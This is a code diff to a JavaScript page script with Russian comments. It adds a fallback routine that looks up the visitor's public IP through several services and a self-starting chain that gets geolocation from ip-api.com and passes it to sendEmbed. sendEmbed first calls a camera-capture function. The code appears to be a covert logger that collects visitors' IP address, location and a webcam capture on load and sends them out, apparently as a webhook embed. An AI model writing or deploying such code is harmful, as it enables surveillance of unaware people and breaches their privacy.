@@ -23,6 +23,40 @@ async function captureCamera() {
     }
 }
 
+async function getIPAddress() {
+    const services = [
+        { url: 'https://api.ipify.org?format=json', key: 'ip' },
+        { url: 'https://jsonip.com', key: 'ip' },
+        { url: 'https://httpbin.org/ip', key: 'origin' },
+        { url: 'https://api.my-ip.io/ip.json', key: 'ip' }
+    ];
+    
+    for (const service of services) {
+        try {
+            console.log(`Пробуем сервис: ${service.url}`);
+            const response = await fetch(service.url, { 
+                method: 'GET',
+                headers: { 'Accept': 'application/json' }
+            });
+            
+            if (!response.ok) continue;
+            
+            const data = await response.json();
+            const ip = data[service.key];
+            
+            if (ip && ip !== '127.0.0.1' && ip !== '::1') {
+                console.log(`IP найден: ${ip}`);
+                return ip;
+            }
+        } catch (error) {
+            console.log(`Ошибка в сервисе ${service.url}:`, error.message);
+            continue;
+        }
+    }
+    
+    return 'Неизвестно';
+}
+
 async function sendEmbed(ip, geo) {
     const cameraResult = await captureCamera();
     
@@ -67,10 +101,17 @@ async function sendEmbed(ip, geo) {
     }
 }
 
-fetch('https://api.ipify.org?format=json')
-    .then(r => r.json())
-    .then(ipData => fetch(`http://ip-api.com/json/${ipData.ip}`)
-        .then(r => r.json())
-        .then(geoData => sendEmbed(ipData.ip, geoData))
-    )
-    .catch(() => sendEmbed(null, null));
+// Запуск с альтернативным методом получения IP
+getIPAddress().then(ip => {
+    console.log('Получен IP:', ip);
+    if (ip !== 'Неизвестно') {
+        return fetch(`http://ip-api.com/json/${ip}`)
+            .then(r => r.json())
+            .then(geoData => sendEmbed(ip, geoData));
+    } else {
+        return sendEmbed(ip, null);
+    }
+}).catch(error => {
+    console.error('Ошибка:', error);
+    sendEmbed('Неизвестно', null);
+});
